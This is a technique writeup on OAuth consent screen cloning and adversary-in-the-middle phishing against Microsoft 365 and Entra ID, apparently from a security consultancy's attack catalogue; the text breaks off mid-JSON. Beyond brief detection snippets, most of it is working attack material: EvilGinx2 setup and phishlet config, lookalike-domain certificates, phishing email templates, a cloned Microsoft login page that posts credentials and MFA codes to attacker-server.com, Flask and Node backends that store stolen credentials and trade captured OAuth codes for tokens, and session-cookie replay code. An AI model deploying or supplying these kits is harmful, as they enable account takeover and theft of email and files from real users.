# [IA-PHISH-003]: OAuth Consent Screen Cloning

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IA-PHISH-003 |
| **MITRE ATT&CK v18.1** | [T1566.002 - Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/) |
| **Tactic** | Initial Access |
| **Platforms** | M365, Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-12-15 |
| **Affected Versions** | All Entra ID versions; all browser-based M365 clients |
| **Patched In** | N/A (design-level OAuth flaw; mitigations are behavioral and endpoint-based only) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Section 6 (Atomic Red Team) not included because OAuth consent screen cloning is not a standardized test technique. All section numbers have been dynamically renumbered based on applicability.

---

## 1. EXECUTIVE SUMMARY

**Concept:** OAuth consent screen cloning attacks abuse the visual trust users place in Microsoft's legitimate OAuth consent screens. Attackers create exact pixel-perfect replicas of the Azure AD/Entra ID login pages or OAuth consent dialogs and host them on attacker-controlled servers or compromised legitimate websites. When victims visit these cloned pages, they believe they are interacting with Microsoft's real infrastructure. The attacker's proxy intercepts the victim's credentials, MFA codes, and session cookies in real-time, then relays them to the legitimate Microsoft servers to complete authentication on behalf of the victim. Once the victim is authenticated via the legitimate service, the attacker captures the resulting authorization code or session token. The victim is then redirected to a legitimate page (often their mailbox or OneDrive), making the attack invisible—the victim has no indication they've been compromised.

**Attack Surface:** The attack exploits fundamental trust boundaries: users cannot visually distinguish a cloned page from a legitimate one (identical UI, logos, colors, fonts, and even organizational branding). No malware, vulnerability exploitation, or technical sophistication is required on the victim's endpoint. The attack works equally well against users with or without MFA enabled—in fact, MFA is often the target of AiTM attacks, as the attacker intercepts the MFA code before the user submits it and relays it to Microsoft servers.

**Business Impact:** **Critical account compromise with persistent access.** Since 2021, AiTM phishing campaigns have targeted over 10,000 organizations. Push Security identified a new variant called "ConsentFix" in December 2025 that combines OAuth consent screen cloning with browser-native ClickFix tactics, achieving account compromise without requiring users to enter passwords or MFA codes. Compromised accounts enable wholesale email exfiltration, lateral movement via forwarding rules and internal phishing, BEC (Business Email Compromise) campaigns targeting organizational contacts, and persistence via MFA method manipulation. Session tokens are long-lived and difficult to revoke, enabling attacker persistence for weeks or months.

**Technical Context:** Unlike device code phishing (IA-PHISH-001) or consent grant phishing (IA-PHISH-002), OAuth consent screen cloning is primarily delivered via watering hole attacks (compromised legitimate websites), malvertising (malicious Google Search results), or phishing emails with links to cloned pages. The attack works by exploiting the fact that browsers cannot distinguish between an attacker's server and Microsoft's server if SSL/TLS certificates are valid (which they are for attacker-controlled domains). Users see a URL in the address bar that may be slightly different (e.g., `login-outlook.example.com` instead of `login.microsoftonline.com`), but most users do not carefully inspect URLs during authentication workflows, especially under time pressure or when social engineering creates urgency.

### Operational Risk

- **Execution Risk:** **Very Low** — Requires only HTML/CSS cloning (no server-side complexity). Attacker duplicates Microsoft's login page, stands up a proxy server, and sends phishing links.
- **Stealth:** **Extremely High** — Operates as a man-in-the-middle proxy. No suspicious commands, registry access, or malware on endpoint. User's browser shows legitimate Microsoft sites after authentication.
- **Reversibility:** **No** — Once session cookies and tokens are stolen, cannot be undone. Requires credential revocation, session cookie invalidation, and forensic investigation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1, 5.2 | Lack of MFA enforcement, device trust validation, and anomalous sign-in detection. |
| **DISA STIG** | AC-2, AC-3, SC-7 | Inadequate account management, access control, and boundary protection. |
| **CISA SCuBA** | IdM-1, IdM-2, IdM-4 | Weak identity governance, MFA enforcement, and phishing-resistant authentication. |
| **NIST 800-53** | AC-2, AC-3, AC-6, SI-4 | Access enforcement, account management, privilege restrictions, monitoring. |
| **GDPR** | Art. 32, 33 | Insufficient security measures; breach notification. |
| **DORA** | Art. 9, 18 | ICT risk management and incident reporting. |
| **NIS2** | Art. 21, 23 | Cyber security measures and incident reporting. |
| **ISO 27001** | A.8.2.3, A.9.2.1, A.9.4.2 | Identity management, authentication, and MFA enforcement. |
| **ISO 27005** | Risk Scenario: "Compromise of User Authentication" | Inadequate MFA and anomalous access detection. |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**

- **Attacker Side:** None. Any attacker can register a domain, obtain an SSL certificate (free via Let's Encrypt), and host a cloned login page.
- **Victim Side:** None. Any M365 user is a potential target.

**Required Access:**

- Attacker must have ability to deliver phishing links via email, search results, or compromised websites.
- Victim must be able to access internet and navigate to attacker's cloned page.
- Attacker must have server infrastructure to host cloned page and proxy authentication requests.

**Supported Versions:**

- **Browsers:** All browsers (Chrome, Edge, Safari, Firefox) are vulnerable. Inability to distinguish legitimate from cloned pages is browser-independent.
- **Entra ID:** All versions.
- **M365:** All versions supporting OAuth-based authentication.

**Tools & Environment:**

- **Phishing Kit:** EvilGinx2 (reverse proxy AiTM framework), Evilginx3, or custom Python proxy (Flask, mitmproxy).
- **SSL/TLS Certificate:** Let's Encrypt (free) or self-signed (triggers browser warnings, less effective).
- **Hosting Infrastructure:** Attacker's own server, cloud VPS (AWS, Azure, DigitalOcean), or compromised legitimate website.
- **Phishing Delivery:** Phishing email service, malvertising (Google Ads abuse), SEO poisoning (Google Search results), watering hole attacks.
- **Domain Registration:** Attacker-owned or lookalike domain (e.g., `outlok-microsoft.com`, `login-outlook.net`).

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Detection of Cloned OAuth Pages and AiTM Attacks

**Browser-Level Indicators (User Education):**

Users should look for:

- **URL mismatch:** Page shows login.microsoftonline.com but address bar shows different domain (e.g., `login-office.example.com`, `login-outlook.example.com`, `login.microsoftonline.xyz`).
- **Certificate inconsistencies:** Browser shows valid certificate but for attacker's domain, not Microsoft (click padlock icon to inspect).
- **Unusual redirects:** After entering credentials, unexpected redirect or page load delay.
- **Missing Microsoft branding elements:** Subtle differences in logos, fonts, or colors compared to known Microsoft pages.

**Network-Level Detection (SOC/Defender):**

```powershell
# Search for sign-in attempts followed by unusual Graph API activity
Connect-MgGraph -Scopes "AuditLog.Read.All"

# Look for sign-ins with suspicious properties (unusual IPs, locations, user agents)
Get-MgAuditLogSignIn -Filter "createdDateTime gt 2025-12-14" | `
  Select-Object UserDisplayName, IPAddress, Location, ClientAppUsed, Status | `
  Where-Object { $_.Status -ne "Success" -and $_.Status -ne "Interrupted" } | `
  Format-Table

# Identify impossible travel patterns (same user from distant IPs in short time)
$signIns = Get-MgAuditLogSignIn -All | `
  Group-Object UserDisplayName | `
  ForEach-Object {
    $locations = $_.Group | Select-Object -ExpandProperty Location | Sort-Object -Unique
    if ($locations.Count -gt 1) {
      Write-Host "[!] Impossible travel detected for $($_.Name)"
      $_.Group | Select-Object CreatedDateTime, IPAddress, Location | Sort-Object CreatedDateTime
    }
  }
```

**Cloud App Activity Analysis:**

```powershell
# Search for suspicious email access patterns post-authentication
Search-UnifiedAuditLog -Operations "MailItemsAccessed", "Set-InboxRule", "New-InboxRule" | `
  Where-Object { $_.CreatedDate -gt (Get-Date).AddDays(-1) } | `
  Select-Object UserIds, Operations, CreatedDate | `
  Format-Table
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Reverse Proxy AiTM Attack Using EvilGinx2

**Supported Versions:** All Entra ID versions; all browsers

**Scenario:** Attacker sets up EvilGinx2 (open-source reverse proxy phishing kit) to proxy Microsoft's login pages in real-time. All HTTP traffic between victim and Microsoft is intercepted. Attacker extracts credentials, MFA codes, and session cookies on the fly, then relays them to legitimate Microsoft servers.

#### Step 1: Set Up EvilGinx2 Infrastructure

**Objective:** Deploy reverse proxy server that will intercept and clone Microsoft's OAuth pages.

**Installation (Linux/Ubuntu):**

```bash
#!/bin/bash

# Install Go (EvilGinx2 dependency)
wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
tar -xzf go1.21.0.linux-amd64.tar.gz -C /usr/local
export PATH=$PATH:/usr/local/go/bin

# Clone EvilGinx2 repository
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2

# Build EvilGinx2
make

# Copy binary to system path
cp evilginx2 /usr/local/bin/

echo "[+] EvilGinx2 installed successfully"
```

**Version Notes:**

- **EvilGinx2:** Latest stable version (2.4.11) works best for M365.
- **EvilGinx3:** Newer version with enhanced evasion; requires Go 1.18+.

#### Step 2: Create Phishing Site Configuration

**Objective:** Configure EvilGinx2 to proxy Microsoft Entra ID login pages.

**Configuration File (phishing.yaml):**

```yaml
---
name: Microsoft Office 365
author: Attacker
min_ver: 2.3.0
sites:
  - name: outlook.com
    url: https://outlook.office.com
    auth_tokens:
      - domain: login.microsoftonline.com
        keys:
          - access_token
          - id_token
          - refresh_token
    auth_urls:
      - https://login.microsoftonline.com
    landing_path: /owa/
    is_landing: false
    login_path: /
    username_field: loginfmt
    password_field: passwd
    error_field: error
    
  - name: outlook (clone)
    url: https://login.microsoftonline.com
    auth_tokens:
      - domain: login.microsoftonline.com
        keys:
          - access_token
          - id_token
          - refresh_token
    auth_urls:
      - https://login.microsoftonline.com
    login_path: /
    username_field: loginfmt
    password_field: passwd
    error_field: error

credentials:
  username:
    key: loginfmt
    search: true
  password:
    key: passwd
    search: true
```

**What This Does:**

- Defines which Microsoft pages to proxy (login.microsoftonline.com, outlook.office.com).
- Specifies which form fields contain username and password.
- Configures which tokens to extract from authentication responses.
- Sets up redirect paths to make the attack seamless.

#### Step 3: Deploy Phishing Site on Attacker Domain

**Objective:** Configure DNS and domain to point to EvilGinx2 server.

**DNS Configuration:**

```bash
# Register attacker-controlled domain or lookalike:
# login-outlook.net (instead of login.microsoftonline.com)
# outlookmail-signin.com
# microsoftoffice365.net (looks legitimate)

# Point subdomain to EvilGinx2 server IP
# Type: A Record
# Name: login
# Value: 192.0.2.100 (attacker's VPS IP)
# TTL: 300

# Alternatively, use wildcard DNS record for flexibility:
# *.outlook.net -> 192.0.2.100
```

**SSL/TLS Certificate (Let's Encrypt):**

```bash
# Install Certbot
apt-get install certbot python3-certbot-nginx

# Generate certificate (free)
certbot certonly --standalone -d login-outlook.net -d *.login-outlook.net --agree-tos -m attacker@email.com

# Renewal is automatic; certificates valid for 90 days

echo "[+] SSL certificate installed at /etc/letsencrypt/live/login-outlook.net/"
```

**What This Does:**

- Creates a valid HTTPS certificate for attacker's domain.
- Browsers will NOT display security warnings.
- Victims see the address bar showing `login-outlook.net` instead of `login.microsoftonline.com`.
- **Effectiveness:** Depends on how well attacker crafted the domain name. `login-outlook.net` looks more legitimate than `evilphishing.xyz`.

#### Step 4: Craft Phishing Email

**Objective:** Deliver phishing link to victims via email, search results, or compromised websites.

**Phishing Email Template:**

```
From: alerts@company.local
Subject: Action Required: Verify Your Account Access - 24 Hours Left

Dear User,

For security reasons, we need to verify your account. Your account will be locked in 24 hours if you do not verify.

Click here to verify: https://login-outlook.net/auth

This is urgent and will take less than 2 minutes.

---
Outlook Support Team
Microsoft Corporation
```

**Delivery Methods:**

1. **Phishing Email:** Sent via compromised email account, commercial phishing service, or attacker-owned mail server.
2. **Malvertising:** Place malicious Google Ads that mimic Outlook login with link to cloned page.
3. **Watering Hole:** Compromise legitimate website and inject iframe pointing to cloned page.
4. **SEO Poisoning:** Create malicious website that ranks high for "outlook login" Google searches.

#### Step 5: Victim Clicks Link and Enters Credentials

**Objective:** Victim navigates to cloned page and authenticates.

**Victim's Experience:**

```
1. User clicks link from phishing email
2. Browser navigates to https://login-outlook.net/auth
3. Page shows: "Microsoft login" (cloned from real Microsoft page)
4. User sees familiar login interface (username, password, organization dropdown)
5. User enters credentials: alice@company.onmicrosoft.com / P@ssw0rd
6. Page shows: "One moment while we prepare your account"
7. [ATTACKER'S PROXY RELAYS CREDENTIALS TO MICROSOFT BEHIND THE SCENES]
8. Microsoft replies: "MFA Required. Enter code from authenticator app"
9. Page shows: "Enter verification code" (MFA prompt, also cloned from real page)
10. User enters MFA code from authenticator app (e.g., 123456)
11. [ATTACKER'S PROXY RELAYS MFA CODE TO MICROSOFT BEHIND THE SCENES]
12. Microsoft grants access and issues session token
13. Page shows: "Signing you in..." then redirects to legitimate Outlook mailbox
14. User is now logged in to their real mailbox—NO SUSPICION
15. [ATTACKER CAPTURES SESSION COOKIE AND TOKENS IN BACKGROUND]
```

**What the Attacker Captures:**

- Username: `alice@company.onmicrosoft.com`
- Password: `P@ssw0rd`
- Session cookie (valid for hours/days)
- Access token (valid for 1 hour)
- Refresh token (valid for months)
- ID token (identity information)

#### Step 6: Attacker Extracts Stolen Data

**Objective:** Retrieve captured credentials and tokens from EvilGinx2 logs.

**EvilGinx2 Interactive Console:**

```bash
# Start EvilGinx2
evilginx2 -debug -o /tmp/evilginx2.log

# In EvilGinx2 console:
evilginx > config domain login-outlook.net
evilginx > phishlet enable outlook
evilginx > letsencrypt domain login-outlook.net
evilginx > start

# Check captured credentials
evilginx > creds

# Output:
# [Username] alice@company.onmicrosoft.com
# [Password] P@ssw0rd
# [Session] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...
# [MFA Code] 123456
# [IP] 203.0.113.45
# [User Agent] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...
# [Timestamp] 2025-12-15 14:23:45 UTC
```

**Exported Credentials:**

```json
{
  "username": "alice@company.onmicrosoft.com",
  "password": "P@ssw0rd",
  "session_cookie": "MSCAuth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
  "refresh_token": "0.ARQAv4J8G_xL...",
  "mfa_method": "authenticator_app",
  "ip_address": "203.0.113.45",
  "location": "New York, US",
  "timestamp": "2025-12-15T14:23:45Z"
}
```

#### Step 7: Attacker Uses Session Cookie to Access Victim's Account

**Objective:** Log into victim's account using captured session cookie, bypassing MFA.

**Using Captured Session Cookie (Browser):**

```bash
# Method 1: Inject session cookie into attacker's browser
# 1. Open browser DevTools (F12)
# 2. Go to Storage → Cookies
# 3. Navigate to https://outlook.office.com
# 4. Create new cookie:
#    Name: MSCAuth
#    Value: <captured_cookie_value>
#    Domain: .outlook.office.com
# 5. Refresh page
# 6. User is now logged in as victim (session replayed)

# Method 2: Using Python requests library
import requests
import json

# Create session with stolen cookie
session = requests.Session()
cookies = {
    "MSCAuth": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
}
session.cookies.update(cookies)

# Access victim's mailbox
mailbox_response = session.get("https://graph.microsoft.com/v1.0/me/messages")
emails = mailbox_response.json()["value"]

print(f"[+] Accessed {len(emails)} emails from victim's mailbox")
for email in emails[:5]:
    print(f"    - {email['subject']} (from {email['from']['emailAddress']['address']})")
```

**What This Does:**

- Session cookie is valid even if victim's password is changed.
- Session cookie is valid even if victim's MFA settings are changed.
- Attacker has full access to victim's mailbox, files, Teams, calendar, contacts.
- MFA is **bypassed** because the session was established BEFORE the attacker accessed the account.

---

### METHOD 2: Indirect Proxy AiTM Attack (Advanced - Storm-1167 Campaign)

**Supported Versions:** All Entra ID versions; all browsers

**Scenario:** Unlike EvilGinx2's reverse proxy (which actively proxies traffic), indirect proxy creates a standalone cloned page hosted on a cloud service (Tencent Cloud, Canva, etc.). The cloned page contains malicious JavaScript that initiates authentication with Microsoft using victim's entered credentials. The attacker captures the resulting tokens without proxying traffic in real-time.

#### Step 1: Host Cloned Login Page on Compromised Cloud Service

**Objective:** Create HTML/CSS clone of Microsoft login page and host on legitimate service.

**HTML Template (Cloned Microsoft Login):**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your Microsoft account</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        /* Exact CSS replica of Microsoft login page */
        body {
            font-family: "Segoe UI", Helvetica, Arial, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 440px;
            margin: 80px auto;
            padding: 0 20px;
        }
        .logo {
            margin-bottom: 30px;
            text-align: center;
        }
        .logo img {
            height: 40px;
        }
        .login-form {
            border: 1px solid #d3d3d3;
            padding: 40px;
            border-radius: 2px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #333;
        }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 2px;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 2px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background: #005a9e;
        }
        .error {
            color: #dc3545;
            font-size: 12px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://c.s-microsoft.com/favicon.ico?v2" alt="Microsoft">
        </div>
        <div class="login-form">
            <form id="loginForm" onsubmit="handleLogin(event)">
                <div class="form-group">
                    <label>Email, phone, or Skype</label>
                    <input type="text" id="username" name="username" required autofocus>
                </div>
                <div class="form-group" id="passwordGroup" style="display:none;">
                    <label>Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <div id="mfaGroup" style="display:none;">
                    <label>Verification code</label>
                    <input type="text" id="mfaCode" name="mfaCode" placeholder="Enter your verification code">
                </div>
                <div id="error" class="error"></div>
                <button type="submit" id="nextBtn">Next</button>
            </form>
        </div>
    </div>

    <script>
        // Malicious JavaScript to authenticate victim against real Microsoft servers
        async function handleLogin(event) {
            event.preventDefault();
            const username = document.getElementById("username").value;
            const passwordEl = document.getElementById("password");
            const mfaEl = document.getElementById("mfaCode");
            const errorEl = document.getElementById("error");
            const nextBtn = document.getElementById("nextBtn");

            // Step 1: If only username entered, make authentication request
            if (!passwordEl.value && !mfaEl.value) {
                try {
                    nextBtn.disabled = true;
                    nextBtn.innerText = "Checking...";

                    // Initiate OAuth flow with Microsoft using victim's username
                    const response = await fetch(
                        "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?" +
                        "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&" +  // Microsoft Graph PowerShell
                        "scope=https://graph.microsoft.com/.default%20offline_access&" +
                        "response_type=code&" +
                        "redirect_uri=" + encodeURIComponent("https://attacker-server.com/callback") + "&" +
                        "login_hint=" + encodeURIComponent(username) +
                        "&response_mode=query"
                    );

                    // Show password field
                    document.getElementById("passwordGroup").style.display = "block";
                    document.getElementById("nextBtn").innerText = "Sign in";
                    nextBtn.disabled = false;

                } catch (err) {
                    errorEl.innerText = "Connection error. Please try again.";
                    nextBtn.disabled = false;
                }
                return;
            }

            // Step 2: If password or MFA code entered, submit to attacker's backend
            const payload = {
                username: username,
                password: passwordEl.value,
                mfa_code: mfaEl.value,
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                ip_address: null  // Will be captured by backend
            };

            // Send stolen credentials to attacker's server
            await fetch("https://attacker-server.com/log-credentials", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            // Redirect to legitimate Microsoft to complete authentication
            // (victim doesn't know they've been compromised)
            window.location.href = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?" +
                "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&" +
                "scope=https://graph.microsoft.com/.default%20offline_access&" +
                "response_type=code&" +
                "redirect_uri=" + encodeURIComponent("https://outlook.office.com") + "&" +
                "login_hint=" + encodeURIComponent(username);
        }
    </script>
</body>
</html>
```

**Hosting on Compromised Legitimate Website:**

```bash
# Attack chain observed in Storm-1167 campaign:
# 1. Attacker compromises legitimate website (e.g., canva.com via stolen credentials)
# 2. Attacker injects cloned login page into subdirectory: /fax-preview/login.html
# 3. Attacker modifies DNS/hosting to serve attacker's page on legitimate domain
# 4. Victim visits legitimate domain + attacker's path: canva.com/fax-preview
# 5. Page appears to come from legitimate domain (high trust)
# 6. User enters credentials, thinking they're on legitimate site
```

#### Step 2: Deliver Phishing Email with Link to Cloned Page

**Objective:** Send phishing email with link to cloned login page.

**Phishing Email (Storm-1167 Variant):**

```
From: trusted-vendor@company.com  (spoofed)
Subject: [Urgent] Fax Document Awaiting Review

Dear User,

You have a new fax document that requires your immediate attention. 

Please review the document: https://canva.com/fax-preview

Best regards,
Fax Service Team
```

**Real-World Storm-1167 Details:**

- **Sender:** Trusted vendor email (spoofed via BEC or compromised vendor account)
- **Link:** Legitimate domain (Canva, OneDrive, DocuSign) with malicious subdirectory
- **URL:** Looks legitimate in email preview; victim clicks without suspicion
- **Success Rate:** High because it leverages vendor trust relationships

#### Step 3: Backend Credential Logging

**Objective:** Attacker's server receives and logs stolen credentials in real-time.

**Backend Server (Flask/Python):**

```python
from flask import Flask, request, jsonify
import json
import sqlite3
from datetime import datetime

app = Flask(__name__)

# Database to store stolen credentials
def init_db():
    conn = sqlite3.connect('stolen_creds.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            mfa_code TEXT,
            timestamp TEXT,
            user_agent TEXT,
            ip_address TEXT
        )
    ''')
    conn.commit()
    conn.close()

@app.route('/log-credentials', methods=['POST'])
def log_credentials():
    """Receive and store stolen credentials"""
    data = request.get_json()
    ip_address = request.remote_addr
    
    # Log to database
    conn = sqlite3.connect('stolen_creds.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO credentials (username, password, mfa_code, timestamp, user_agent, ip_address)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (
        data.get('username'),
        data.get('password'),
        data.get('mfa_code'),
        datetime.now().isoformat(),
        data.get('user_agent'),
        ip_address
    ))
    conn.commit()
    conn.close()
    
    print(f"[+] Credentials captured: {data['username']} from {ip_address}")
    
    return jsonify({"status": "ok"}), 200

@app.route('/callback', methods=['GET'])
def oauth_callback():
    """Receive OAuth authorization code"""
    code = request.args.get('code')
    state = request.args.get('state')
    session_state = request.args.get('session_state')
    
    print(f"[+] OAuth code captured: {code[:50]}...")
    
    # Exchange code for tokens (if we have client secret)
    # ... token exchange code ...
    
    return jsonify({"status": "code captured"}), 200

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

**Credentials Captured (Logged to Database):**

```
| username | password | mfa_code | timestamp | ip_address |
|---|---|---|---|---|
| alice@company.onmicrosoft.com | P@ssw0rd | 123456 | 2025-12-15T14:30:00Z | 203.0.113.45 |
| bob@company.onmicrosoft.com | MySecurePass! | 654321 | 2025-12-15T14:45:00Z | 203.0.113.46 |
```

---

### METHOD 3: ConsentFix — Browser-Native ClickFix + OAuth (December 2025 Variant)

**Supported Versions:** All Entra ID versions; all browsers

**Scenario:** Most advanced variant combining OAuth consent phishing with browser-native ClickFix tactics. Attacker tricks victims into copying and pasting legitimate OAuth authorization URLs (containing authorization codes) from their browser's address bar into an attacker-controlled phishing page. No credentials are entered, yet attacker obtains full OAuth tokens.

#### Step 1-2: Create Malicious Website with Fake Cloudflare Turnstile

**Objective:** Host page that appears legitimate and contains fake CAPTCHA to prevent security analysis.

**HTML Template (ConsentFix):**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Verifying Your Account</title>
    <meta charset="utf-8">
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
</head>
<body style="font-family: Arial; max-width: 600px; margin: 100px auto;">
    <h1>Verification Required</h1>
    <p>Please verify you are human to continue.</p>
    
    <!-- Fake Cloudflare Turnstile -->
    <div class="cf-turnstile" data-sitekey="1x00000000000000000000AA" data-theme="light"></div>
    
    <p>After verification, you'll be guided to complete your Azure CLI setup.</p>
    
    <div id="emailVerification" style="display:none; margin-top: 20px;">
        <label>Enter your email address:</label>
        <input type="email" id="targetEmail" placeholder="user@company.com" style="width: 100%; padding: 10px; margin-top: 10px;">
        <button onclick="startAzureCliFlow()" style="width: 100%; padding: 10px; margin-top: 10px; background: #0078d4; color: white; border: none; cursor: pointer;">Continue</button>
    </div>
    
    <script>
        // Simulate CAPTCHA verification (actually just targeting specific emails)
        function onTurnstileSuccess(token) {
            // Only show email input for specific organizations (evasion technique)
            document.getElementById("emailVerification").style.display = "block";
            
            // Or directly check IP and other conditions before proceeding
            fetch("https://attacker-server.com/check-target", {
                method: "POST",
                body: JSON.stringify({
                    ip: null,  // Backend will capture this
                    user_agent: navigator.userAgent
                })
            }).then(r => r.json()).then(data => {
                if (data.is_target) {
                    document.getElementById("emailVerification").style.display = "block";
                } else {
                    window.location = "https://legitimate-website.com";  // Redirect if not target
                }
            });
        }
        
        function startAzureCliFlow() {
            const email = document.getElementById("targetEmail").value;
            
            // Open new tab with legitimate Microsoft Azure CLI OAuth endpoint
            // User will authenticate normally in that tab
            const azureCliUrl = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?" +
                "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&" +  // Azure CLI app ID
                "scope=https://graph.microsoft.com/.default%20offline_access&" +
                "response_type=code&" +
                "redirect_uri=http://localhost:8080/&" +  // Azure CLI redirect to localhost
                "login_hint=" + encodeURIComponent(email);
            
            const childWindow = window.open(azureCliUrl, "azure_cli_login", "width=600,height=600");
            
            // Monitor child window for authorization code in URL
            const checkWindow = setInterval(() => {
                try {
                    if (childWindow.location.href.includes("localhost") && childWindow.location.href.includes("code=")) {
                        // Child window redirected to localhost with authorization code
                        const url = childWindow.location.href;
                        
                        // Extract code from URL
                        const codeMatch = url.match(/code=([^&]+)/);
                        if (codeMatch) {
                            const authCode = codeMatch[1];
                            
                            // Prompt user to copy and paste the URL (ConsentFix social engineering)
                            const userUrl = prompt(
                                "Copy the URL from the new tab (it contains your verification code) " +
                                "and paste it below to complete setup:\n\n" +
                                "Press Ctrl+A in the address bar, then Ctrl+C to copy.",
                                url
                            );
                            
                            if (userUrl && userUrl.includes("code=")) {
                                // User pasted URL; extract code
                                const extractedCode = userUrl.match(/code=([^&]+)/)[1];
                                
                                // Send authorization code to attacker's backend
                                fetch("https://attacker-server.com/capture-oauth-code", {
                                    method: "POST",
                                    headers: { "Content-Type": "application/json" },
                                    body: JSON.stringify({
                                        email: email,
                                        oauth_code: extractedCode,
                                        timestamp: new Date().toISOString()
                                    })
                                });
                                
                                alert("Setup complete! You can now close this window.");
                                childWindow.close();
                                clearInterval(checkWindow);
                            }
                        }
                    }
                } catch (e) {
                    // Cross-origin restrictions prevent full access to child window
                    // Fallback: just prompt user to paste URL manually
                }
            }, 1000);
        }
    </script>
</body>
</html>
```

#### Step 3: User Signs In to Legitimate Microsoft (No Phishing)

**Objective:** User authenticates normally to real Microsoft server in popup window.

**User's Experience:**

```
1. User sees "Verification Required" page with fake Cloudflare CAPTCHA
2. User enters their email address
3. Clicks "Continue"
4. New browser tab opens showing legitimate Microsoft login
5. User sees: "Sign in to your Microsoft account"
6. User enters credentials (not to phishing page, but to REAL Microsoft)
7. Microsoft displays: "Two-step verification" (if MFA enabled)
8. User enters MFA code
9. Microsoft redirects to: http://localhost:8080/?code=M.R3_BAY[...]&session_state=xyz
10. Browser shows: "localhost refused to connect" (expected, Azure CLI redirect)
11. URL bar shows: the authorization code
12. User copies the URL from address bar
13. Returns to original phishing page and pastes the URL
14. Attacker captures authorization code from URL
15. Attacker exchanges authorization code for OAuth tokens
16. Attacker gains full access to victim's Microsoft account
```

**Critical Difference from Traditional Phishing:**

- User NEVER enters credentials on a phishing page
- User authenticates to REAL Microsoft servers (MFA is real)
- No passwords or MFA codes are exposed to attacker during authentication
- Yet, attacker still obtains authorization code and full OAuth tokens
- **Bypasses phishing-resistant authentication** (like passkeys) because there's no credential compromise

#### Step 4: Backend Exchanges Authorization Code for Tokens

**Objective:** Attacker exchanges captured authorization code for full OAuth tokens.

**Backend (Node.js/Express):**

```javascript
const express = require('express');
const axios = require('axios');
const app = express();

const CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46";  // Azure CLI
const CLIENT_SECRET = null;  // Azure CLI is a public client (no secret needed)
const REDIRECT_URI = "http://localhost:8080/";

app.post('/capture-oauth-code', async (req, res) => {
    const { email, oauth_code, timestamp } = req.body;
    
    console.log(`[+] Authorization code captured from ${email} at ${timestamp}`);
    console.log(`[+] Code: ${oauth_code.substring(0, 50)}...`);
    
    // Exchange authorization code for tokens
    try {
        const tokenResponse = await axios.post(
            "https://login.microsoftonline.com/organizations/oauth2/v2.0/token",
            {
                client_id: CLIENT_ID,
                scope: "https://graph.microsoft.com/.default offline_access",
                code: oauth_code,
                redirect_uri: REDIRECT_URI,
                grant_type: "authorization_code"
            }
        );
        
        const tokens = tokenResponse.data;
        console.log(`[+] Tokens received:`);
        console.log(`    Access Token: ${tokens.access_token.substring(0, 50)}...`);
        console.log(`    Refresh Token: ${tokens.refresh_token.substring(0, 50)}...`);
        console.log(`    Expires In: ${tokens.expires_in} seconds`);
        
        // Store tokens for later use
        saveTokensToDatabase(email, tokens);
        
        // Now attacker can:
        // 1. Access victim's emails, files, Teams, calendar via Graph API
        // 2. Refresh tokens automatically when they expire
        // 3. Maintain persistence for months
        
        res.json({ status: "success", message: "Tokens captured and stored" });
        
    } catch (error) {
        console.error(`[-] Error exchanging authorization code: ${error.message}`);
        res.status(400).json({ status: "error", message: error.message });
    }
});

function saveTokensToDatabase(email, tokens) {
    // Save to database with timestamp for later access
    console.log(`[*] Storing tokens for ${email} in database...`);
    // ... database insert code ...
}

app.listen(443, () => console.log("Listening on 443"));
```

**Tokens Now Available:**

```json
{
    "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
